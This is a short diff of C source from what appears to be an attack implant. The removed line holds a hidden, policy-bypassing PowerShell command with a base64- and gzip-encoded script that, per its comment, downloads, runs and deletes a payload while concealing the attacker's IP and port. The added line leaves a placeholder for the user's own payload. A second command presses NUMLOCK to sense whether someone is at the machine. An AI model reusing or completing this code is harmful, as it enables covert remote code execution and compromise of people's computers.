@@ -12,8 +12,8 @@ unsigned int mnt = 60000;
 unsigned int hr = 3600000;
 
 // Powershell command to download, execute, and delete the payload script.  Encoded and compressed to try to hide ip and port information.
-char command1[] = "powershell.exe -Nop -NonI -W Hidden -Exec Bypass -Command \"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAL+a7FYCAz2OsQ6CMBRFf+UNTdAorxZiMTRMGuPk4uDiAuURMbQ1+hD9e+vieG7OTY6wlacpDc2NLMPp82RyeCTGMzXboSfPBsQIFSRX5nsppSpyzHJUWqHa6FJlq7WWjE3NSTS7aIpDcAQLSC7/2eIuTH4IdbvvB5qJcSm6uQHrWqQ3gbTxaeBBLrwo7WPCj79zDxlJmwAAAA=='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\"";
-char command2[] = "powershell.exe -Nop -NonI -W Hidden -Exec Bypass -Command \"$k=New-Object -ComObject WScript.Shell;$k.SendKeys('{NUMLOCK}');\"";
+char command1[] = "powershell.exe -Nop -NonI -W Hidden -Exec Bypass -Command \"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAL+.........."; // Put your PowerShell Script here. Make sure you escape any quotes \"
+char command2[] = "powershell.exe -Nop -NonI -W Hidden -Exec Bypass -Command \"$k=New-Object -ComObject WScript.Shell;$k.SendKeys('{NUMLOCK}');\""; // Don't change this line, it is the numlock trigger used to decide if someone is using the computer or not.
 
 bool connect_good;
 
